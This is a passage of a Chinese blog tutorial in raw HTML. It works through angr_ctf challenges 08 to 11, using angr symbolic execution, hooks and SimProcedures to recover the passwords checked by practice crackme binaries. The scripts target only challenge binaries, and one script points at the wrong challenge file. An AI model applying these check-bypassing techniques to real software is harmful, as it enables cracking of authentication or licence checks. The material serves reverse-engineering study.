class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> simulation.found:<br>    solution_state = simulation.found[<span class="hljs-number">0</span>]<br><span class="hljs-comment"># 加密后的password的地址</span><br>    constrained_parameter_addr = <span class="hljs-number">0x0804A050</span> <span class="hljs-comment"># 即输入字符串保存的地址</span><br>    constrained_parameter_size_bytes = <span class="hljs-number">16</span>   <span class="hljs-comment"># password的长度(字节)</span><br>    <br>     <span class="hljs-comment"># 从内存中加载password  ( 输入 )</span><br>    constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_addr,constrained_parameter_size_bytes)<br>    <br><span class="hljs-comment"># 对比的字符串</span><br>    constrained_parameter_desired_value = <span class="hljs-string">&#x27;MRXJKZYRKMKENFZB&#x27;</span><br>    <br><span class="hljs-comment"># 约束表达式</span><br>    constrained_expression = constrained_parameter_bitvector == constrained_parameter_desired_value                 <br> <br>    <span class="hljs-comment"># 添加约束</span><br>    solution_state.add_constraints(constrained_expression)<br><br>    solution = long_to_bytes(solution_state.se.<span class="hljs-built_in">eval</span>(password))<br>    <span class="hljs-built_in">print</span>(solution.decode())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the sokution&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>那么脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/08_angr_constraints&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    start_addr = <span class="hljs-number">0x08048625</span> <span class="hljs-comment"># 在输入函数之后</span><br>    initial_state = project.factory.blank_state(addr=start_addr)<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, <span class="hljs-number">16</span>*<span class="hljs-number">8</span>)<br>    password_addr = <span class="hljs-number">0x0804A050</span><br>    initial_state.memory.store(password_addr, password)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    addr_to_check_constraint = <span class="hljs-number">0x08048669</span> <span class="hljs-comment"># 在检查函数之前</span><br>    simulation.explore(find=addr_to_check_constraint)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        constrained_parameter_addr = <span class="hljs-number">0x0804A050</span> <span class="hljs-comment"># 加密后的password的地址</span><br>        constrained_parameter_size_bytes = <span class="hljs-number">16</span>   <span class="hljs-comment"># password的长度(字节)</span><br>        constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_addr, constrained_parameter_size_bytes)  <span class="hljs-comment"># 从内存中加载password</span><br><br>        constrained_parameter_desired_value = <span class="hljs-string">&#x27;MRXJKZYRKMKENFZB&#x27;</span>  <span class="hljs-comment"># reference string</span><br><br>        constrained_expression = constrained_parameter_bitvector == constrained_parameter_desired_value                               <span class="hljs-comment"># 约束表达式</span><br><br>        solution_state.add_constraints(constrained_expression)    <span class="hljs-comment"># 添加约束</span><br><br>        solution = long_to_bytes(solution_state.se.<span class="hljs-built_in">eval</span>(password))<br>        <span class="hljs-built_in">print</span>(solution.decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the sokution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>在这一个题目中我们学会了将<code>angr</code>的遍历范围进行约束，来提升求解速度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 从内存中加载password</span><br>constrained_parameter_bitvector = solution_state.memory.load(constrained_parameter_addr, constrained_parameter_size_bytes) <span class="hljs-comment"># 参数为目标值的加载的地址，字节数大小</span><br><span class="hljs-comment"># 添加约束</span><br>constrained_expression = XXX <span class="hljs-comment"># 条件表达式</span><br>solution_state.add_constraints(constrained_expression)   <br></code></pre></td></tr></table></figure><h2 id="09-angr-hooks">09_angr_hooks</h2><p>拖入<code>IDA</code>分析，可以看到程序是由两个输入组成，当第一个输入错误时便会退出，其中第一次的输入经过加密后需要等于<code>password</code>，第二次的输入需要等于加密后的<code>password</code></p><p><img src="https://s2.loli.net/2022/03/18/PATtI6wEYSkDRmX.png" alt=""></p><p>我们观察一下程序中需要<code>hook</code>的函数，可以看到程序执行的是进行比较字符串的操作，返回的是一个<code>bool</code>类型的数据，对此我们可以直接自己创建一个函数来进行直接比较并返回对应<code>bool</code>值，而不需要通过程序一个个的遍历判断，下面展示如何实现一个<code>hook</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 绕过函数的地址</span><br>check_equals_caller_addr = <span class="hljs-number">0x080486A9</span><br><span class="hljs-comment"># 通过 hook 跳过目标函数的长度</span><br>instruction_to_skip_length = <span class="hljs-number">0x080486BB</span> - <span class="hljs-number">0x080486A9</span><br><span class="hljs-comment"># 创建一个 hook 函数</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params">check_equals_caller_addr, instruction_to_skip_length</span>) </span><span class="hljs-comment"># 参数为绕过函数的地址,绕过函数长度</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip_check_equals</span>(<span class="hljs-params">state</span>):</span><br>    user_input_buffer_addr = <span class="hljs-number">0x0804A054</span><span class="hljs-comment"># 保存输入变量地址</span><br>    user_input_buffer_length = <span class="hljs-number">16</span><span class="hljs-comment"># 第一个 scanf 的输入长度，此处为字节大小</span><br>    <span class="hljs-comment"># 将输入载入内存</span><br>    user_input_string = state.memory.load(<br>        user_input_buffer_addr,<br>        user_input_buffer_length<br>    )<br><span class="hljs-comment"># 目的字符串</span><br>    check_against_string = <span class="hljs-string">&#x27;MRXJKZYRKMKENFZB&#x27;</span><br><span class="hljs-comment"># 创建判断条件 -&gt; 字符串的比较</span><br>    state.regs.eax = claripy.If(<br>        user_input_string == check_against_string,<br>        claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), <span class="hljs-comment"># 程序的返回值是给寄存器 eax 保存</span><br>        claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># eax 为 32 bit 的寄存器，所以大小设置为 32</span><br>    )  <span class="hljs-comment"># claripy.BVV(返回数据,返回 bit 大小)      </span><br><span class="hljs-comment"># 开始模拟</span><br>simulation = project.factory.simgr(initial_state)<br></code></pre></td></tr></table></figure><p>那么程序的关键部分也便实现了，我们可以编写如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    initial_state = project.factory.entry_state()<br><br>    <span class="hljs-comment"># 绕过函数的地址</span><br>    check_equals_caller_addr = <span class="hljs-number">0x080486A9</span><br>    <span class="hljs-comment"># 通过 hook 跳过目标函数的长度</span><br>    instruction_to_skip_length = <span class="hljs-number">0x080486BB</span> - <span class="hljs-number">0x080486A9</span><br><br>    <span class="hljs-comment"># 创建一个 hook 函数</span><br>    <span class="hljs-comment"># 参数为绕过函数的地址,绕过函数长度</span><br><span class="hljs-meta">    @project.hook(<span class="hljs-params">check_equals_caller_addr, length = instruction_to_skip_length</span>)</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip_check_equals</span>(<span class="hljs-params">state</span>):</span><br>        user_input_buffer_addr = <span class="hljs-number">0x0804A054</span>  <span class="hljs-comment"># 保存输入变量地址</span><br>        user_input_buffer_length = <span class="hljs-number">16</span>  <span class="hljs-comment"># 第一个 scanf 的输入长度，此处为字节大小</span><br>        <span class="hljs-comment"># 将输入载入内存</span><br>        user_input_string = state.memory.load(<br>            user_input_buffer_addr,<br>            user_input_buffer_length<br>        )<br>        <span class="hljs-comment"># 目的字符串</span><br>        check_against_string = <span class="hljs-string">&#x27;MRXJKZYRKMKENFZB&#x27;</span><br>        <span class="hljs-comment"># 创建判断条件 -&gt; 字符串的比较</span><br>        <span class="hljs-comment"># 同时设定返回值</span><br>        state.regs.eax = claripy.If(<br>            user_input_string == check_against_string,<br>            claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>),  <span class="hljs-comment"># 程序的返回值是给寄存器 eax 保存</span><br>            claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)  <span class="hljs-comment"># eax 为 32 bit 的寄存器，所以大小设置为 32</span><br>        )  <span class="hljs-comment"># claripy.BVV(返回数据,返回 bit 大小)</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br>    <span class="hljs-comment"># 开始模拟</span><br>    simulation = project.factory.simgr(initial_state)<br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution = solution_state.posix.dumps(sys.stdin.fileno())<br><br>        <span class="hljs-built_in">print</span>(solution.decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>通过这个例子我们学会了使用<code>hook</code>来代替程序中的函数，并执行我们自己构造的函数。其关键函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个 hook 函数</span><br><span class="hljs-comment"># 参数为绕过函数的地址,绕过函数长度</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params">check_equals_caller_addr, length = instruction_to_skip_length</span>)</span><br><span class="hljs-comment"># 创建判断条件 -&gt; 字符串的比较</span><br><span class="hljs-comment"># 同时设定返回值</span><br>state.regs.eax = claripy.If(<br>    user_input_string == check_against_string, <span class="hljs-comment"># 创建判断语句</span><br>    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>),  <span class="hljs-comment"># 程序的返回值是给寄存器 eax 保存</span><br>    claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)  <span class="hljs-comment"># eax 为 32 bit 的寄存器，所以大小设置为 32</span><br>)  <span class="hljs-comment"># claripy.BVV(返回数据,返回 bit 大小)</span><br></code></pre></td></tr></table></figure><h2 id="10-angr-simprocedures">10_angr_simprocedures</h2><p>上一道题目我们是只利用一个<code>hook</code>进行模拟了一个函数，但是在这个题目里面我们可以找到许许多多的函数，如果一个个写会累死的 ( bushi )</p><p><img src="https://s2.loli.net/2022/03/18/FtN9GgJP5QwnUuA.png" alt=""></p><p>所以在这个题目中我们需要想办法<code>hook</code>一片的函数，那么我们为什么不想一下我们把名字<code>hook</code>了，意味着每次调用这个相同名字的函数时执行的便是我们自己编写的过程。实现如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个类</span><br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mySimPro</span>(<span class="hljs-params">angr.SimProcedure</span>):</span><br>       <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, user_input_addr, user_input_length</span>):</span><br>           <span class="hljs-comment"># angr 输入的符号向量</span><br>           angr_bvs = self.state.memory.load(<br>               user_input_addr,<br>               user_input_length<br>           )<br>           <span class="hljs-comment"># 目标字符串</span><br>           desired = <span class="hljs-string">&#x27;MRXJKZYRKMKENFZB&#x27;</span><br>           <span class="hljs-keyword">return</span> claripy.If(<br>               desired == angr_bvs, <span class="hljs-comment"># 条件判断</span><br>               claripy.BVV(<span class="hljs-number">1</span>,<span class="hljs-number">32</span>), <span class="hljs-comment"># 返回值设置</span><br>               claripy.BVV(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>)<br>           )<br>   <br>   <span class="hljs-comment"># hook 的函数名</span><br>   check_symbol = <span class="hljs-string">&#x27;check_equals_MRXJKZYRKMKENFZB&#x27;</span><br>   <span class="hljs-comment"># 创建 hook</span><br>   project.hook_symbol(check_symbol,mySimPro())    <span class="hljs-comment"># 创建一个类来继承 angr.SimProcedure</span><br>   simulation = project.factory.simgr(initial_state)<br><br></code></pre></td></tr></table></figure><p>那么脚本编写如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> describe<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    project = angr.Project(binary_path)<br>    initial_state = project.factory.entry_state()<br><br>    <span class="hljs-comment"># 创建一个类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mySimPro</span>(<span class="hljs-params">angr.SimProcedure</span>):</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, user_input_addr, user_input_length</span>):</span><br>            <span class="hljs-comment"># angr 输入的符号向量</span><br>            angr_bvs = self.state.memory.load(<br>                user_input_addr,<br>                user_input_length<br>            )<br>            <span class="hljs-comment"># 目标字符串</span><br>            desired = <span class="hljs-string">&#x27;MRXJKZYRKMKENFZB&#x27;</span><br>            <span class="hljs-keyword">return</span> claripy.If(<br>                desired == angr_bvs, <span class="hljs-comment"># 条件判断</span><br>                claripy.BVV(<span class="hljs-number">1</span>,<span class="hljs-number">32</span>), <span class="hljs-comment"># 返回值设置</span><br>                claripy.BVV(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>)<br>            )<br>    <br>    <span class="hljs-comment"># hook 的函数名</span><br>    check_symbol = <span class="hljs-string">&#x27;check_equals_MRXJKZYRKMKENFZB&#x27;</span><br>    <span class="hljs-comment"># 创建 hook</span><br>    project.hook_symbol(check_symbol,mySimPro())    <span class="hljs-comment"># 创建一个类来继承 angr.SimProcedure</span><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span><br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution = solution_state.posix.dumps(sys.stdin.fileno())<br><br>        <span class="hljs-built_in">print</span>(solution.decode())<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>在这道题目中我们学习了如何<code>hook</code>一个函数名，从而使程序在每次运行到这个函数名时执行的都是我们<code>hook</code>后的函数，对此我们利用继承的方式对其进行<code>hook</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementCheckEquals</span>(<span class="hljs-params">angr.SimProcedure</span>):</span> <span class="hljs-comment"># 继承angr的SimProcedure类</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, to_check, length</span>):</span>             <span class="hljs-comment"># 模拟 angr 的输入</span><br>        user_input_buffer_addr = to_check<br>        user_input_buffer_length = length<br><br>        user_input_string = self.state.memory.load(<br>            user_input_buffer_addr,<br>            user_input_buffer_length<br>        )<br><br>        check_against_string = XXX <span class="hljs-comment"># 检查函数，来判断输入的正确与否 </span><br><br>        <span class="hljs-keyword">return</span> claripy.If(<br>            user_input_string == check_against_string,<br>            claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), <span class="hljs-comment"># 返回值 返回值的 bit 位大小</span><br>            claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br>        )<br><br><br><span class="hljs-comment"># 没去符号名时</span><br>check_equals_symbol = <span class="hljs-string">&#x27;check_equals_MRXJKZYRKMKENFZB&#x27;</span> <span class="hljs-comment"># 函数名</span><br>project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())<br>-----------------------------------------------------------------------------------<br><span class="hljs-comment"># hook原来的check函数，也可以使用上面的代码，但是如果程序去符号的话，就只能这种方法</span><br>check_equals_addr = XXX<br>project.hook(check_equals_addr, ReplacementCheckEquals())  <span class="hljs-comment"># 目标函数的地址,继承了angr.SimProcedure的类名</span><br></code></pre></td></tr></table></figure><h2 id="11-angr-sim-scanf">11_angr_sim_scanf</h2><p>随着<code>angr</code>的更新迭代，似乎逐渐支持了<code>scanf</code>这一类的函数，可以不需要手动模拟<code>scanf</code>，<code>angr</code>可以直接自动化模拟，问了一下草莓师傅，似乎<code>angr</code>现在还能自动<code>hook</code>，关于这个我也没有去测试过，也不是太了解这些。</p><p>根据题目要求，需要我们模拟<code>scanf</code>来进行模拟输入，实现方式似乎类似于<code>hook</code>函数名，同样需要我们进行继承<code>angr</code>下的<code>SimpProcedure</code>，只是里面的一些函数发生了变化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span><br>   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, fmt, scanf0_addr, scanf1_addr</span>):</span><br>        scanf0 = claripy.BVS(<span class="hljs-string">&#x27;scanf0&#x27;</span>, <span class="hljs-number">4</span>*<span class="hljs-number">8</span>) <span class="hljs-comment"># 符号化输入</span><br>        scanf1 = claripy.BVS(<span class="hljs-string">&#x27;scanf1&#x27;</span>, <span class="hljs-number">4</span>*<span class="hljs-number">8</span>)<br><br>        self.state.memory.store(scanf0_addr, scanf0, endness=project.arch.memory_endness) <span class="hljs-comment"># 将输入保存到内存空间</span><br>        self.state.memory.store(scanf1_addr, scanf1, endness=project.arch.memory_endness)<br><br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] = scanf0 <span class="hljs-comment"># 将scanf0和scanf1保存到当前状态</span><br>        self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>] = scanf1<br>    <br>    scanf_symbol = <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>  <span class="hljs-comment"># 类似于 hook 函数名的方式</span><br>    project.hook_symbol(scanf_symbol, ReplacementScanf())<br><br>    simulation = project.factory.simgr(initial_state)<br><br></code></pre></td></tr></table></figure><p>通过上述模拟可以将输入的字符串保存到内存空间，那么我们便可以写出如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    binary_path = <span class="hljs-string">&#x27;../program/11_angr_sim_scanf&#x27;</span><br>    project = angr.Project(binary_path)<br><br>    initial_state = project.factory.entry_state()<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span><br><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, fmt, scanf0_addr, scanf1_addr</span>):</span><br>            scanf0 = claripy.BVS(<span class="hljs-string">&#x27;scanf0&#x27;</span>, <span class="hljs-number">4</span>*<span class="hljs-number">8</span>)<br>            scanf1 = claripy.BVS(<span class="hljs-string">&#x27;scanf1&#x27;</span>, <span class="hljs-number">4</span>*<span class="hljs-number">8</span>)<br><br>            self.state.memory.store(scanf0_addr, scanf0, endness=project.arch.memory_endness)<br>            self.state.memory.store(scanf1_addr, scanf1, endness=project.arch.memory_endness)<br><br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] = scanf0 <span class="hljs-comment"># 将scanf0和scanf1保存到当前状态</span><br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>] = scanf1<br><br>    scanf_symbol = <span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span> <br>    project.hook_symbol(scanf_symbol, ReplacementScanf())<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span 